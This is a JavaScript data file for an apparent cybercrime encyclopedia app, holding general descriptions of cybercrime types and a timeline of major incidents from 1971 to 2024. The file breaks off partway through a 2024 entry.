// ═══════════════════════════════════════════════
//  CYBERCRIME ENCYCLOPEDIA  ·  Database
// ═══════════════════════════════════════════════

const DB = {

// ──────────────────────────────────────────────
//  CYBERCRIMES
// ──────────────────────────────────────────────
cybercrimes: [
  {
    id: 'phishing',
    name: 'Phishing',
    icon: '🎣',
    severity: 'high',
    tags: ['social engineering', 'email', 'fraud', 'credential theft'],
    shortDesc: 'Deceptive emails or websites that trick users into revealing sensitive information.',
    content: `Phishing is one of the most prevalent cybercrimes worldwide. Attackers send fraudulent communications — typically email — that appear to come from reputable sources (banks, tech companies, government agencies) to trick individuals into revealing passwords, credit card numbers, or other sensitive data.

VARIANTS:
• Spear Phishing — targeted attacks against specific individuals using personalized information
• Whaling — attacks targeting high-value executives (CEOs, CFOs)
• Vishing — voice/phone-based phishing
• Smishing — SMS/text message phishing
• Clone Phishing — exact replica of a legitimate email with malicious links
• Pharming — redirecting users to fake websites via DNS poisoning

HOW IT WORKS:
1. Attacker crafts a convincing fake email/page
2. Victim receives the message and is urged to act quickly (urgency is key)
3. Victim clicks malicious link or downloads infected attachment
4. Credentials or data are harvested, or malware is installed

IMPACT: Billions of dollars lost annually. Responsible for over 90% of data breaches as an initial access vector.

LEGAL: Prosecuted under the Computer Fraud and Abuse Act (CFAA), CAN-SPAM Act, and equivalent laws globally.`,
    meta: { origin: 'Mid-1990s (AOL)', annualLoss: '$3.5 billion+ (FBI IC3 2023)', prevalence: 'Most common cybercrime globally' }
  },
  {
    id: 'ransomware',
    name: 'Ransomware',
    icon: '🔐',
    severity: 'critical',
    tags: ['malware', 'encryption', 'extortion', 'financial'],
    shortDesc: 'Malware that encrypts victim files and demands payment for decryption keys.',
    content: `Ransomware is malicious software that encrypts a victim's files or locks them out of their system, then demands a ransom payment (usually cryptocurrency) in exchange for the decryption key.

EVOLUTION:
• 1989: AIDS Trojan — first known ransomware, spread via floppy disk
• 2013: CryptoLocker — popularized Bitcoin ransoms
• 2017: WannaCry — global epidemic affecting 200,000+ systems in 150 countries
• 2017: NotPetya — most destructive ($10B+ damage), disguised as ransomware
• 2019–present: Double extortion — encrypt AND threaten to publish stolen data

MAJOR RANSOMWARE FAMILIES:
• REvil (Sodinokibi) — attacked Kaseya, JBS Foods
• LockBit — most prolific ransomware group (2022–2024)
• Conti — responsible for Ireland HSE attack
• BlackCat (ALPHV) — cross-platform, Rust-based
• Cl0p — exploited MOVEit zero-day (2023)

HOW IT WORKS:
1. Initial access via phishing, RDP brute-force, or exploiting vulnerabilities
2. Lateral movement and privilege escalation
3. Data exfiltration (for double extortion)
4. Deployment of encryptor across the network
5. Ransom note displayed; Bitcoin/Monero wallet provided

IMPACT: Average ransom payment exceeded $1.5M in 2023. Healthcare, critical infrastructure, and government are primary targets.`,
    meta: { firstCase: '1989 — AIDS Trojan', avgRansom: '$1.5M+ (2023)', topVector: 'Phishing / RDP exploitation' }
  },
  {
    id: 'identity-theft',
    name: 'Identity Theft',
    icon: '🪪',
    severity: 'high',
    tags: ['fraud', 'financial', 'personal data', 'social engineering'],
    shortDesc: 'Stealing personal information to impersonate victims for financial gain.',
    content: `Identity theft occurs when someone unlawfully obtains and uses another person's personal data — Social Security numbers, credit card numbers, bank account information, or medical records — typically for financial fraud.

TYPES:
• Financial Identity Theft — opening fraudulent accounts, making purchases
• Medical Identity Theft — using someone's insurance to receive medical care
• Criminal Identity Theft — providing stolen identity to law enforcement when arrested
• Synthetic Identity Theft — combining real and fake info to create new identities
• Child Identity Theft — using a minor's SSN (often undiscovered for years)
• Tax Identity Theft — filing fraudulent tax returns

METHODS OF STEALING IDENTITY:
• Data breaches (largest source)
• Phishing and social engineering
• Dumpster diving (physical documents)
• Skimming devices on ATMs/POS terminals
• Malware and keyloggers
• Account takeover attacks
• Dark web purchases of stolen credential databases

IMPACT: 15+ million Americans affected annually. Average victim spends 200+ hours resolving issues. Financial damage averages $1,100 per victim.`,
    meta: { annualVictims: '15M+ (USA)', avgLoss: '$1,100 per victim', topSource: 'Data breaches' }
  },
  {
    id: 'ddos',
    name: 'DDoS Attack',
    icon: '💥',
    severity: 'critical',
    tags: ['denial of service', 'botnet', 'infrastructure', 'network'],
    shortDesc: 'Overwhelming a target server or network with traffic to make it unavailable.',
    content: `A Distributed Denial of Service (DDoS) attack floods a target — website, server, or network — with massive volumes of traffic from multiple sources (a botnet), rendering it inaccessible to legitimate users.

TYPES:
• Volumetric Attacks — overwhelm bandwidth (UDP flood, ICMP flood, DNS amplification)
• Protocol Attacks — exploit weaknesses in network protocols (SYN flood, Ping of Death)
• Application Layer Attacks — target web applications (HTTP flood, Slowloris)

NOTABLE ATTACKS:
• 2007: Estonia cyberattacks — first nation-state DDoS (attributed to Russia)
• 2016: Dyn DNS attack — Mirai botnet took down Twitter, Netflix, Reddit
• 2018: GitHub attacked — 1.3 Tbps attack (largest at the time)
• 2020: AWS reported 2.3 Tbps attack (largest ever recorded)
• 2023: Record-breaking HTTP/2 Rapid Reset attacks (398M rps)

PERPETRATORS: Hacktivists, cybercriminals (DDoS-for-hire / booter services), nation-states, competitors, extortionists.

IMPACT: Costs $50,000–$500,000 per hour of downtime. Used for extortion, hacktivism, competitive sabotage, or as a smokescreen for other attacks.`,
    meta: { largestAttack: '2.3 Tbps (AWS, 2020)', avgCost: '$50K–$500K/hr downtime', commonTool: 'Botnets / DDoS-for-hire' }
  },
  {
    id: 'data-breach',
    name: 'Data Breach',
    icon: '🗃️',
    severity: 'critical',
    tags: ['data exfiltration', 'espionage', 'financial', 'privacy'],
    shortDesc: 'Unauthorized access and theft of sensitive, protected, or confidential data.',
    content: `A data breach is a security incident where sensitive, confidential, or protected information is accessed, stolen, or disclosed without authorization.

LARGEST DATA BREACHES IN HISTORY:
• Yahoo (2013–2014): 3 billion accounts — largest ever
• LinkedIn (2021): 700M user records scraped and sold
• Facebook (2021): 533M users' data leaked on hacker forum
• Equifax (2017): 147M consumer records including SSNs
• Marriott / Starwood (2014–2018): 500M guest records
• Adobe (2013): 153M user records
• Target (2013): 40M credit/debit cards — holiday shopping breach
• Ashley Madison (2015): 32M users exposed (reputational damage + suicides)
• RockYou2024 (2024): 10 billion plaintext passwords — largest password leak

COMMON BREACH VECTORS:
• Unpatched vulnerabilities
• Credential stuffing / brute force
• Insider threats
• Supply chain compromise
• Misconfigured cloud storage (S3 buckets)
• SQL injection

LEGAL CONSEQUENCES: GDPR fines up to 4% of global revenue. CCPA fines per record. Class-action lawsuits.`,
    meta: { largestBreach: 'Yahoo — 3 billion accounts', avgCost: '$4.45M per breach (IBM 2023)', topVector: 'Stolen/compromised credentials' }
  },
  {
    id: 'social-engineering',
    name: 'Social Engineering',
    icon: '🧠',
    severity: 'high',
    tags: ['manipulation', 'psychology', 'phishing', 'pretexting'],
    shortDesc: 'Psychological manipulation of people into performing actions or divulging information.',
    content: `Social engineering exploits human psychology rather than technical vulnerabilities. Attackers manipulate people into breaking security procedures or giving up confidential information.

TECHNIQUES:
• Pretexting — creating a fabricated scenario to extract information (e.g., impersonating IT support)
• Baiting — leaving infected USB drives in parking lots; victim plugs it in
• Quid Pro Quo — offering a service in exchange for information
• Tailgating/Piggybacking — physically following someone through secured doors
• Watering Hole — compromising websites frequented by targets
• Vishing — phone-based manipulation
• Impersonation — posing as authority figures

PSYCHOLOGICAL TRIGGERS EXPLOITED:
• Authority ("I'm from the IRS...")
• Urgency ("Your account will be suspended in 24 hours")
• Fear ("You've been hacked, act now")
• Reciprocity (offering help first)
• Social proof ("Your colleagues already updated their credentials")

REAL CASES: Kevin Mitnick's entire career was built on social engineering. The 2020 Twitter hack (compromising Obama, Biden, Gates accounts) was executed through social engineering of Twitter employees.

DEFENSE: Security awareness training is the primary defense. No technology patch exists for human psychology.`,
    meta: { successRate: '98% of attacks involve social engineering', topVector: 'Phone / email impersonation', defense: 'Security awareness training' }
  },
  {
    id: 'cryptojacking',
    name: 'Cryptojacking',
    icon: '⛏️',
    severity: 'medium',
    tags: ['malware', 'cryptocurrency', 'resource theft', 'covert'],
    shortDesc: 'Secretly using a victim\'s computing resources to mine cryptocurrency.',
    content: `Cryptojacking is the unauthorized use of someone's computer or device to mine cryptocurrency. Attackers install mining software covertly (via malware or malicious browser scripts) and use the victim's CPU/GPU power and electricity.

HOW IT WORKS:
• File-based: Malware installed on the device runs persistently
• Browser-based: JavaScript mining code embedded in websites (CoinHive was most notorious — shut down 2019)
• Cloud cryptojacking: Attackers compromise cloud accounts to spin up mining VMs

INDICATORS OF COMPROMISE:
• High CPU/GPU usage with no obvious cause
• Device overheating
• Slow performance, fan running constantly
• Increased electricity bills
• Battery draining rapidly on mobiles

NOTABLE INCIDENTS:
• 2018: Los Angeles Times website was cryptojacking visitors
• 2018: Thousands of government websites injected with Coinhive script
• 2018: Tesla's AWS cloud was compromised for Monero mining
• GitHub Actions abused for crypto mining (ongoing issue)

PREFERRED CRYPTOCURRENCY: Monero (XMR) — privacy-focused, CPU-mineable, untraceable.

IMPACT: While not immediately destructive, causes hardware damage over time, increases energy costs, and can lead to system failures.`,
    meta: { preferredCoin: 'Monero (XMR)', peakYear: '2017–2018', impact: 'Hardware damage, electricity theft' }
  },
  {
    id: 'cyberstalking',
    name: 'Cyberstalking & Harassment',
    icon: '👁️',
    severity: 'high',
    tags: ['harassment', 'privacy', 'doxing', 'online abuse'],
    shortDesc: 'Using technology to persistently harass, monitor, or threaten individuals.',
    content: `Cyberstalking involves the use of electronic communications to stalk, harass, or threaten an individual or group. It often involves a pattern of behavior designed to cause fear, distress, or harm.

FORMS:
• Email/message harassment — relentless threatening messages
• Doxing — publishing someone's private information (address, workplace, family details)
• Impersonation — creating fake accounts to damage reputation
• Monitoring — using spyware to track location, communications, activity
• Revenge porn — non-consensual sharing of intimate images
• Swatting — filing false police/SWAT reports to victim's address (can be lethal)
• Coordinated online harassment — organized mob harassment (often via forums, Discord)

TOOLS USED BY STALKERS:
• Stalkerware (commercial spyware marketed as "parental controls")
• GPS tracking devices
• Social media monitoring tools
• OSINT techniques
• Keyloggers

LEGAL STATUS: Illegal in most jurisdictions under cyberstalking laws, Computer Fraud and Abuse Act, and state-level harassment laws. Revenge porn is criminalized in 48 US states.

VICTIMS: Primarily women, journalists, activists, and public figures. Domestic violence situations increasingly involve digital stalking.`,
    meta: { primaryVictims: 'Women, journalists, activists', legalStatus: 'Criminal offense in most countries', tool: 'Stalkerware, OSINT, doxing' }
  },
  {
    id: 'insider-threat',
    name: 'Insider Threat',
    icon: '🕵️',
    severity: 'critical',
    tags: ['employee', 'espionage', 'sabotage', 'data theft'],
    shortDesc: 'Malicious or negligent actions by employees, contractors, or trusted insiders.',
    content: `Insider threats originate from within the organization — employees, former employees, contractors, or business partners who have inside information about security practices, data, and computer systems.

TYPES:
• Malicious Insider — intentionally steals data, sabotages systems, or sells access
• Negligent Insider — accidentally causes a breach through carelessness (clicking phishing links, misconfiguring systems)
• Compromised Insider — employee whose credentials have been stolen by an external attacker

MOTIVATIONS FOR MALICIOUS INSIDERS:
• Financial gain (selling data to competitors or on dark web)
• Revenge after being fired or disciplined
• Ideology (whistleblowing gone wrong, nation-state recruitment)
• Coercion by criminal organizations

FAMOUS CASES:
• Edward Snowden — leaked NSA mass surveillance programs (2013)
• Reality Winner — leaked classified NSA document about Russian election interference
• Chelsea Manning — leaked classified military/diplomatic documents to WikiLeaks
• Terry Childs — San Francisco network admin held city networks hostage
• Robert Hanssen — FBI agent who spied for Russia for 22 years

DETECTION: User and Entity Behavior Analytics (UEBA), DLP solutions, privileged access monitoring, anomaly detection.

IMPACT: Average insider threat incident costs $16.2M per organization. Harder to detect than external attacks.`,
    meta: { avgCost: '$16.2M per incident', detectionTime: 'Average 85 days to detect', topMotivation: 'Financial gain / revenge' }
  },
  {
    id: 'carding',
    name: 'Carding & Financial Fraud',
    icon: '💳',
    severity: 'high',
    tags: ['financial', 'credit card', 'fraud', 'dark web'],
    shortDesc: 'Theft and fraudulent use of payment card information.',
    content: `Carding refers to the trafficking and fraudulent use of stolen credit/debit card information. It is a massive underground economy with dedicated forums, markets, and tools.

CARDING METHODS:
• Skimming — physical devices on ATMs or POS terminals that capture card data
• Online scraping — stealing card data from compromised e-commerce sites (Magecart attacks)
• Phishing — tricking victims into entering card details on fake sites
• Data breaches — bulk purchase of card data from dark web markets
• Triangulation fraud — using stolen cards to buy goods, then reselling them

THE UNDERGROUND ECOSYSTEM:
• Carding forums (Joker's Stash, BriansClub, UniCC — most shut down)
• Card data sold in dumps (magnetic stripe data) or fullz (complete identity packages)
• Prices: $5–$30 per card depending on type/country; up to $150 for fullz
• Checking services — automated bots to verify which cards are still active

FAMOUS CASES:
• Albert Gonzalez — stole 170M+ card numbers (TJX, Heartland). Sentenced to 20 years.
• Joker's Stash — marketplace that sold 40M+ cards before closing in 2021

MONEY LAUNDERING: Purchases of gift cards, cryptocurrency, luxury goods, or mules who make ATM withdrawals.

IMPACT: Card fraud costs financial industry $28B+ annually worldwide.`,
    meta: { annualLoss: '$28B+ worldwide', cardPrice: '$5–$150 on dark web', topCase: "Albert Gonzalez — 170M+ cards" }
  },
  {
    id: 'cyber-espionage',
    name: 'Cyber Espionage',
    icon: '🔭',
    severity: 'critical',
    tags: ['nation-state', 'APT', 'intelligence', 'surveillance'],
    shortDesc: 'State-sponsored or corporate spying through digital means.',
    content: `Cyber espionage involves the covert use of digital techniques to gain unauthorized access to sensitive information held by governments, corporations, or individuals for strategic, military, economic, or political advantage.

STATE ACTORS:
• Russia: Fancy Bear (APT28), Cozy Bear (APT29), Sandworm
• China: APT1 (Comment Crew), APT10, APT40, Volt Typhoon
• North Korea: Lazarus Group, Kimsuky
• Iran: OilRig (APT34), Charming Kitten
• USA/Five Eyes: NSA TAO, GCHQ (as revealed by Snowden)

TECHNIQUES USED:
• Zero-day exploits
• Spear phishing targeting specific individuals
• Supply chain compromise
• Living-off-the-land (using legitimate tools to avoid detection)
• Watering hole attacks
• Physical compromise of hardware (NSA ANT catalog)

NOTABLE OPERATIONS:
• Operation Aurora (2009) — China targeted Google, Adobe, 30+ companies
• Stuxnet (2010) — USA/Israel sabotaged Iran's nuclear centrifuges
• Shadow Brokers (2016) — leaked NSA cyberweapons
• SolarWinds/SUNBURST (2020) — Russian SVR compromised 18,000+ organizations
• Volt Typhoon (ongoing) — China pre-positioning in US critical infrastructure

IMPACT: Loss of military secrets, intellectual property worth trillions, election interference, diplomatic crises.`,
    meta: { topActors: 'Russia, China, USA, North Korea, Iran', detectionTime: 'Average 197 days', topTool: 'APT with custom malware' }
  },
  {
    id: 'botnet',
    name: 'Botnet Operation',
    icon: '🤖',
    severity: 'high',
    tags: ['malware', 'infrastructure', 'C2', 'zombie network'],
    shortDesc: 'Networks of compromised computers controlled remotely for malicious purposes.',
    content: `A botnet is a network of internet-connected devices (computers, routers, IoT devices) that have been infected with malware and are controlled remotely by an attacker (botmaster) via a Command and Control (C2) server.

USES OF BOTNETS:
• DDoS attacks for hire
• Spam campaigns (sending billions of emails)
• Credential stuffing attacks
• Cryptocurrency mining
• Click fraud (ad fraud)
• Ransomware distribution
• Proxy services for anonymization

FAMOUS BOTNETS:
• Mirai (2016) — IoT botnet that crashed Dyn DNS, taking down half the internet
• Emotet — most dangerous botnet (2014–2021), used as MaaS (Malware-as-a-Service)
• GameOver Zeus — P2P botnet for banking fraud; stole $100M+
• Necurs — spam botnet (9M+ nodes at peak)
• Conficker (2008) — 10–15M infected Windows machines; never used for major attack
• Storm Worm — peer-to-peer botnet, 1–50M nodes

BOTNET ECONOMY:
• Rented for $25–$1000/hour for DDoS attacks
• MaaS (Malware-as-a-Service) business model

TAKEDOWNS: FBI + Europol + private sector "Operation Tovar" took down GameOver Zeus. Emotet taken down in January 2021 global law enforcement operation.`,
    meta: { largestBotnet: 'Conficker — 15M+ nodes', rentalPrice: '$25–$1000/hr', topPlatform: 'IoT devices, Windows' }
  }
],

// ──────────────────────────────────────────────
//  HISTORY
// ──────────────────────────────────────────────
history: [
  {
    id: 'creeper-1971',
    year: 1971,
    name: 'The Creeper — First Self-Replicating Program',
    tags: ['first', 'worm', 'ARPANET'],
    severity: 'info',
    shortDesc: 'The world\'s first self-replicating program, considered a precursor to viruses.',
    content: `Created by Bob Thomas at BBN Technologies, Creeper was an experimental self-replicating program that traveled through ARPANET (predecessor to the internet). It displayed the message "I'M THE CREEPER: CATCH ME IF YOU CAN." It didn't cause damage but proved self-propagation was possible. The Reaper program was later written to delete it — making it the first "anti-malware."`
  },
  {
    id: 'mitnick-1983',
    year: 1983,
    name: 'Kevin Mitnick\'s First Arrest',
    tags: ['hacker', 'Mitnick', 'social engineering'],
    severity: 'medium',
    shortDesc: 'Kevin Mitnick arrested for breaking into ARPANET and Pentagon computers.',
    content: `At age 17, Kevin Mitnick broke into the ARPANET. In 1983, he was arrested for breaking into Pentagon computers through the University of Southern California. He was sentenced to 6 months in a youth correctional facility — the beginning of a legendary criminal career. The same year, the film WarGames depicted a teenage hacker nearly starting World War III, sparking public awareness about hacking.`
  },
  {
    id: 'morris-worm-1988',
    year: 1988,
    name: 'The Morris Worm — First Major Internet Attack',
    tags: ['worm', 'internet', 'first conviction'],
    severity: 'high',
    shortDesc: 'The first worm to gain widespread attention; infected ~6,000 computers (10% of the internet).',
    content: `Created by Cornell graduate student Robert Tappan Morris, the Morris Worm was the first worm to gain widespread attention and is considered one of the most significant events in cybersecurity history. It exploited vulnerabilities in Unix sendmail, fingerd, and rsh/rexec. Infected approximately 6,000 computers (~10% of the internet at the time), causing $10M–$100M in damages. Morris became the first person convicted under the Computer Fraud and Abuse Act (CFAA). He is now a professor at MIT.`
  },
  {
    id: 'aol-phishing-1994',
    year: 1994,
    name: 'First Known Phishing Attacks (AOL)',
    tags: ['phishing', 'AOL', 'social engineering'],
    severity: 'medium',
    shortDesc: 'Hackers use AOL chat rooms to steal passwords — the origin of the word "phishing."',
    content: `The term "phishing" originated in the mid-1990s when hackers began impersonating AOL employees in chat rooms to steal users' passwords and payment information. The "ph" spelling is a nod to "phreaking" — the older practice of hacking telephone systems. The group AOHell created tools to automate these attacks and flood AOL with spam, crashing the service. This marked the beginning of social engineering as a criminal enterprise.`
  },
  {
    id: 'iloveyou-2000',
    year: 2000,
    name: 'ILOVEYOU Virus — Love Bug',
    tags: ['virus', 'worm', 'Philippines', 'email'],
    severity: 'critical',
    shortDesc: 'Worm that infected 50M+ computers in 10 days, causing $10 billion in damages.',
    content: `The ILOVEYOU worm (also known as the Love Bug) was created by Filipino programmer Onel de Guzman. Sent as an email with the subject "ILOVEYOU" and an attachment "LOVE-LETTER-FOR-YOU.TXT.vbs," it spread through email contacts upon opening. Within 10 days it had infected 50 million computers worldwide including the Pentagon, CIA, and UK Parliament — causing an estimated $10 billion in damages. The Philippines had no cybercrime laws at the time, so de Guzman was never prosecuted. The incident led to the creation of cybercrime laws in multiple countries.`
  },
  {
    id: 'anonymous-2003',
    year: 2003,
    name: 'Anonymous — Birth of Hacktivism',
    tags: ['hacktivist', 'Anonymous', '4chan', 'collective'],
    severity: 'medium',
    shortDesc: 'Anonymous emerges from 4chan, becoming the world\'s most notorious hacktivist collective.',
    content: `Anonymous emerged from the imageboard 4chan's /b/ (random) board around 2003, initially as a loosely associated group sharing content. By 2008 they launched Operation Chanology against the Church of Scientology, and evolved into a major hacktivist collective. Major operations included: Project Chanology (2008), Operation Payback against anti-piracy organizations (2010), support for Arab Spring protesters (2011), targeting of ISIS (2015), various anti-government operations globally. Their motto: "We are Anonymous. We are Legion. We do not forgive. We do not forget. Expect us."`
  },
  {
    id: 'estonia-2007',
    year: 2007,
    name: 'Estonia Cyberattacks — First Nation-State Cyberwar',
    tags: ['nation-state', 'DDoS', 'Russia', 'critical infrastructure'],
    severity: 'critical',
    shortDesc: 'Russia-attributed DDoS attacks crippled Estonia\'s digital infrastructure for weeks.',
    content: `In April–May 2007, following Estonia's decision to relocate a Soviet-era war memorial, coordinated DDoS attacks crippled Estonian banks, media outlets, and government websites for weeks. Estonia, one of the world's most digitally advanced societies, was nearly paralyzed. Attributed to Russian hackers (possibly state-sponsored), though Russia denied involvement. This is considered the first cyberwar and led NATO to establish the Cooperative Cyber Defence Centre of Excellence (CCDCOE) in Tallinn. The Tallinn Manual on international cyber law was developed as a result.`
  },
  {
    id: 'stuxnet-2010',
    year: 2010,
    name: 'Stuxnet — First Cyberweapon',
    tags: ['nation-state', 'ICS', 'zero-day', 'Iran', 'USA', 'Israel'],
    severity: 'critical',
    shortDesc: 'The world\'s first cyberweapon, physically destroyed Iranian nuclear centrifuges.',
    content: `Stuxnet was a sophisticated computer worm jointly developed by the United States and Israel (Operation Olympic Games) to sabotage Iran's nuclear program. It specifically targeted Siemens industrial control systems (SCADA) used in Iran's Natanz uranium enrichment facility, causing centrifuges to spin at destructive speeds while reporting normal operation to operators. It used 4 zero-day exploits (unprecedented), had a valid digital signature (stolen from Realtek and JMicron), and spread via infected USB drives. Stuxnet destroyed approximately 1,000 centrifuges — setting back Iran's nuclear program by years. It marked the first known use of malware to physically destroy critical infrastructure, blurring the line between cyber and kinetic warfare.`
  },
  {
    id: 'lulzsec-psn-2011',
    year: 2011,
    name: 'LulzSec & PlayStation Network Breach',
    tags: ['LulzSec', 'Sony', 'data breach', 'hacktivist'],
    severity: 'high',
    shortDesc: 'Sony PSN breach exposed 77M accounts; LulzSec went on a 50-day hacking spree.',
    content: `2011 was a landmark year for hacking. The PlayStation Network breach in April exposed 77 million accounts including credit card data, keeping PSN offline for 23 days and costing Sony $171M. LulzSec — a splinter group of Anonymous — then went on a 50-day rampage hacking Sony Pictures, Nintendo, the FBI's InfraGard, CIA website, Bethesda, News International, and more. LulzSec was ultimately undone when FBI informant Sabu (Hector Monsegur) turned on his crew. Six members were arrested and convicted. Operation AntiSec continued in parallel.`
  },
  {
    id: 'snowden-2013',
    year: 2013,
    name: 'Edward Snowden — NSA Mass Surveillance Revelations',
    tags: ['whistleblower', 'NSA', 'surveillance', 'privacy'],
    severity: 'critical',
    shortDesc: 'NSA contractor leaks classified documents revealing global mass surveillance programs.',
    content: `Edward Snowden, an NSA contractor working for Booz Allen Hamilton, leaked classified NSA documents to journalists Glenn Greenwald (The Guardian) and Laura Poitras. The revelations exposed PRISM (data collection from Google, Facebook, Apple, Microsoft), bulk collection of phone metadata of all Americans under Section 215, XKeyscore (global internet surveillance), MUSCULAR (tapping Google and Yahoo data centers), and Five Eyes intelligence-sharing alliance. Snowden fled to Hong Kong, then was granted asylum in Russia, where he remains. The revelations sparked a global debate about privacy, surveillance, and civil liberties. The USA FREEDOM Act (2015) was passed in response.`
  },
  {
    id: 'wannacry-2017',
    year: 2017,
    name: 'WannaCry Ransomware — Global Epidemic',
    tags: ['ransomware', 'North Korea', 'EternalBlue', 'NHS'],
    severity: 'critical',
    shortDesc: 'Ransomware using NSA\'s leaked EternalBlue exploit infected 200,000+ systems in 150 countries.',
    content: `WannaCry ransomware used EternalBlue — an NSA exploit leaked by Shadow Brokers — to spread via SMB vulnerability (MS17-010) without any user interaction. It infected 200,000+ computers in 150 countries in 24 hours, demanding $300–$600 in Bitcoin. The UK's NHS was severely impacted — operations cancelled, ambulances diverted. Attributed to North Korea's Lazarus Group. Marcus Hutchins (MalwareTech), a 22-year-old British security researcher, discovered and activated a killswitch domain, halting the spread. Microsoft had released patch MS17-010 two months earlier — those who patched were safe. Total damage: $4–8 billion.`
  },
  {
    id: 'solarwinds-2020',
    year: 2020,
    name: 'SolarWinds Supply Chain Attack',
    tags: ['supply chain', 'Russia', 'APT29', 'espionage', 'SVR'],
    severity: 'critical',
    shortDesc: 'Russian SVR compromised SolarWinds software update to infiltrate 18,000+ organizations including US government.',
    content: `In what is considered the most sophisticated cyberattack ever discovered, Russian SVR (Foreign Intelligence Service) — APT29/Cozy Bear — compromised the build process of SolarWinds Orion IT monitoring software. A backdoor called SUNBURST was inserted into a legitimate software update downloaded by 18,000+ customers including the US Treasury, State Department, DHS, Pentagon, NATO, and top tech companies. Attackers had access for 9+ months before discovery. FireEye discovered the attack in December 2020 while investigating their own breach. The backdoor used sophisticated techniques including domain generation algorithms, mimicking legitimate Orion network traffic, and only activating after a 2-week dormancy period. Estimated 100 US federal agencies and 1,000+ private companies were breached.`
  },
  {
    id: 'colonial-pipeline-2021',
    year: 2021,
    name: 'Colonial Pipeline Ransomware Attack',
    tags: ['ransomware', 'DarkSide', 'critical infrastructure', 'energy'],
    severity: 'critical',
    shortDesc: 'DarkSide ransomware shut down the largest US fuel pipeline for 5 days, causing fuel shortages.',
    content: `DarkSide ransomware group attacked Colonial Pipeline — operator of the largest US fuel pipeline (5,500 miles, 45% of East Coast fuel supply) — using a compromised VPN password found on the dark web. Colonial shut down pipeline operations for 5 days causing widespread fuel shortages, panic buying, and a state of emergency in 17 states. The company paid a $4.4M Bitcoin ransom, of which the FBI recovered $2.3M. The attack prompted Biden's Executive Order on improving nation's cybersecurity. DarkSide's infrastructure was shut down shortly after amid suspected US government pressure. The password used was a legacy VPN account with no MFA.`
  },
  {
    id: 'uber-lapsus-2022',
    year: 2022,
    name: 'Uber Breach & Lapsus$ Group',
    tags: ['Lapsus$', 'social engineering', 'MFA fatigue', 'teenager'],
    severity: 'high',
    shortDesc: 'Teenage hackers use MFA fatigue attacks to breach Uber, Microsoft, Nvidia, Samsung, and more.',
    content: `Lapsus$ was a threat actor group (primarily teenagers, many British and Brazilian) who conducted high-profile breaches using social engineering and MFA fatigue attacks. Their victims included Uber (full internal network access via MFA fatigue on a contractor), Microsoft (source code of Bing, Cortana), Samsung (190GB of source code), Nvidia (employee credentials, source code), Okta (customer data), and Rockstar Games (GTA VI footage). The Uber hack: attacker bought Uber contractor credentials on dark web, then bombarded them with MFA push notifications until the contractor accepted. Several members were arrested in the UK and Brazil. The group demonstrated that sophisticated technical skills are not required for major breaches.`
  },
  {
    id: 'ai-attacks-2023',
    year: 2023,
    name: 'Rise of AI-Powered Cyberattacks',
    tags: ['AI', 'deepfake', 'LLM', 'WormGPT', 'MOVEit'],
    severity: 'critical',
    shortDesc: 'AI tools democratize sophisticated attacks: deepfake fraud, AI-written phishing, LLM jailbreaks.',
    content: `2023 marked a paradigm shift with AI weaponization in cybercrime and several landmark incidents.

AI-POWERED ATTACK TOOLS:
• WormGPT and FraudGPT — uncensored large language models sold on dark web forums for generating phishing emails, malware code, and fraud scripts with no ethical guardrails
• AI-generated phishing — hyper-personalized, grammatically perfect lures at industrial scale
• AI-assisted vulnerability discovery — faster automated exploit development using code analysis models
• Deepfake CEO fraud — audio and video deepfakes used to impersonate executives; a $25M+ theft executed via voice clone of a CFO in a video call

MAJOR INCIDENTS:
• MOVEit Zero-Day (CVE-2023-34362): Cl0p ransomware group exploited a SQL injection vulnerability in MOVEit Transfer software, a widely used managed file transfer platform. Affected 2,500+ organizations including US government agencies, British Airways, BBC, Shell, and universities worldwide. One of the largest supply-chain-style mass exploitations in history.
• 3CX Supply Chain Attack (March): North Korean Lazarus Group trojanized the 3CX VoIP desktop client, itself infected via a trojanized trading app (Trading Technologies). A supply chain within a supply chain.
• MGM Resorts Breach (September): Scattered Spider group social-engineered MGM's IT helpdesk via a 10-minute LinkedIn call, deploying ransomware. $100M+ in losses, systems down for 10 days. Caesars Entertainment paid $15M ransom quietly.
• HTTP/2 Rapid Reset DDoS: Google, Cloudflare, and AWS disclosed a novel DDoS technique achieving 398 million requests per second — the largest attack ever recorded at the time.
• Okta Support System Breach: HAR files stolen from Okta's support system exposed session tokens used to access BeyondTrust, Cloudflare, and 1Password customer tenants.

LEGAL ACTIONS:
• FBI and DOJ indicted Hive ransomware operators after a 7-month infiltration of the group's infrastructure, distributing decryption keys to 300+ victims.
• Genesis Market seized (Operation Cookie Monster) — 119 arrests across 17 countries; the market sold complete browser session "bots" enabling account takeover without passwords.`
  },
  {
    id: 'xz-utils-2024',
    year: 2024,
    name: 'XZ Utils Backdoor — Near-Miss Supply Chain Catastrophe',
    tags: ['supply chain', 'backdoor', 'Linux', 'open source', 'North Korea suspected'],
    severity: 'critical',
    shortDesc: 'A multi-year social engineering campaign planted a backdoor in a core Linux compression library days before widespread deployment.',
    content: `The XZ Utils backdoor (CVE-2024-3094) is considered one of the most sophisticated and alarming software supply chain attacks ever discovered — notable primarily because it was caught just in time.

THE ATTACK:
A threat actor operating under the persona "Jia Tan" (JiaT75) spent approximately two years building trust in the XZ Utils open source project, a compression library present in virtually every Linux distribution. The attacker:
• Contributed legitimate, high-quality code over 2+ years to build credibility
• Used sock puppet accounts to create social pressure on the original maintainer, Lasse Collin, to "hand over" the project due to "burnout"
• Once gaining commit access, inserted a highly obfuscated backdoor into the build system (not the source code directly) that modified the liblzma library
• The backdoor specifically targeted systemd-linked sshd on systemd-based Linux systems, allowing remote code execution via a crafted RSA key before authentication

DISCOVERY:
Microsoft engineer Andres Freund discovered the backdoor by accident on March 29, 2024, while investigating unusual SSH login latency on a Debian testing machine. He noticed sshd was consuming 500ms more CPU than expected and traced it to the malicious liblzma. His timely public disclosure prevented what could have been a near-universal Linux backdoor.

IMPACT (POTENTIAL VS ACTUAL):
• Actual: Limited — only reached Fedora Rawhide, Fedora 40 Beta, Debian unstable/experimental, and a few rolling-release distros before discovery
• Potential: If deployed in stable releases, it would have backdoored SSH on hundreds of millions of Linux servers globally
• CISA and major distros issued emergency advisories; affected systems were rolled back within days

ATTRIBUTION:
Widely attributed to a sophisticated nation-state actor, with many analysts pointing to North Korea (Lazarus Group) or a Russia-affiliated group based on operational patterns. No definitive public attribution confirmed.

SIGNIFICANCE: Demonstrated that patient, multi-year infiltration of open source maintainers is a viable and terrifying attack surface. Sparked major discussion about open source security, maintainer burnout, and the need for SBOM (Software Bill of Materials).`
  },
  {
    id: 'change-healthcare-2024',
    year: 2024,
